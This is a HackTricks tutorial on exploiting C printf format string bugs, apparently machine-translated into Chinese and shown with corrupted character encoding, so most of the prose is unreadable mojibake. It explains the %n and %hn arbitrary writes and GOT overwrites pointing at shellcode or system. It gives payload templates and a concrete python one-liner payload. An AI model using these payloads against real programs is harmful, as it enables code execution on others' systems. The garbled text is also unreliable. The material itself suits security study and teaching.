# æ ¼å¼åŒ–å­—ç¬¦ä¸²

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­å®£ä¼ **å—ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

åœ¨Cä¸­ï¼Œ**`printf`**æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¯ç”¨äº**æ‰“å°**ä¸€äº›å­—ç¬¦ä¸²ã€‚è¯¥å‡½æ•°æœŸæœ›çš„**ç¬¬ä¸€ä¸ªå‚æ•°**æ˜¯**å¸¦æœ‰æ ¼å¼åŒ–ç¬¦å·çš„åŸå§‹æ–‡æœ¬**ã€‚æ¥ä¸‹æ¥æœŸæœ›çš„å‚æ•°æ˜¯è¦**æ›¿æ¢**åŸå§‹æ–‡æœ¬ä¸­çš„**æ ¼å¼åŒ–ç¬¦å·**çš„**å€¼**ã€‚

å½“å°†**æ”»å‡»è€…æ–‡æœ¬ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°**ä¼ é€’ç»™æ­¤å‡½æ•°æ—¶ï¼Œæ¼æ´å°±ä¼šå‡ºç°ã€‚æ”»å‡»è€…å°†èƒ½å¤Ÿé€šè¿‡**æ»¥ç”¨printfæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èƒ½åŠ›**æ¥**ç¼–å†™ä»»ä½•åœ°å€ä¸­çš„ä»»ä½•æ•°æ®**ï¼Œä»è€Œèƒ½å¤Ÿ**æ‰§è¡Œä»»æ„ä»£ç **ã€‚

æ ¼å¼åŒ–ç¬¦å·ï¼š
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **å†™å…¥**äº†**å†™å…¥çš„å­—èŠ‚æ•°**åˆ°**æŒ‡å®šçš„åœ°å€ã€‚å†™å…¥**ä¸æˆ‘ä»¬éœ€è¦**å†™å…¥çš„åå…­è¿›åˆ¶æ•°ä¸€æ ·å¤šçš„å­—èŠ‚**æ˜¯æ‚¨å¯ä»¥**å†™å…¥ä»»ä½•æ•°æ®**çš„æ–¹æ³•ã€‚
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### **åˆ©ç”¨æµç¨‹**

å¦‚å‰æ‰€è¿°ï¼Œæ­¤æ¼æ´å…è®¸**åœ¨ä»»ä½•åœ°å€ä¸Šå†™å…¥ä»»ä½•å†…å®¹ï¼ˆä»»æ„å†™å…¥ï¼‰**ã€‚

ç›®æ ‡æ˜¯**è¦†ç›–**ç¨åå°†è¢«è°ƒç”¨çš„**GOTè¡¨**ä¸­å‡½æ•°çš„**åœ°å€**ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†åœ°å€è®¾ç½®ä¸ºä½äºå¯æ‰§è¡Œéƒ¨åˆ†çš„**shellcode**ï¼Œä½†å¾ˆå¯èƒ½æ‚¨æ— æ³•åœ¨å¯æ‰§è¡Œéƒ¨åˆ†ç¼–å†™shellcodeã€‚\
å› æ­¤ï¼Œå¦ä¸€ä¸ªé€‰é¡¹æ˜¯**è¦†ç›–**ä¸€ä¸ª**ä»ç”¨æˆ·æ¥æ”¶å‚æ•°**çš„**å‡½æ•°**ï¼Œå¹¶å°†å…¶æŒ‡å‘**`system`**å‡½æ•°ã€‚

é€šå¸¸éœ€è¦æ‰§è¡Œä¸¤ä¸ªæ­¥éª¤æ¥å†™å…¥åœ°å€ï¼šé¦–å…ˆå†™å…¥åœ°å€çš„**2å­—èŠ‚**ï¼Œç„¶åå†™å…¥å¦å¤–çš„2å­—èŠ‚ã€‚ä¸ºæ­¤ï¼Œä½¿ç”¨**`$hn`**ã€‚

**HOB**ç”¨äºåœ°å€çš„2ä¸ªé«˜å­—èŠ‚\
**LOB**ç”¨äºåœ°å€çš„2ä¸ªä½å­—èŠ‚

å› æ­¤ï¼Œç”±äºæ ¼å¼å­—ç¬¦ä¸²çš„å·¥ä½œæ–¹å¼ï¼Œæ‚¨éœ€è¦**é¦–å…ˆå†™å…¥è¾ƒå°çš„**\[HOBï¼ŒLOB]ï¼Œç„¶åå†å†™å…¥å¦ä¸€ä¸ªã€‚

å¦‚æœ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

å¦‚æœ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

## Pwntools æ¨¡æ¿

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°å‡†å¤‡æ­¤ç±»æ¼æ´çš„åˆ©ç”¨çš„æ¨¡æ¿ï¼š

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
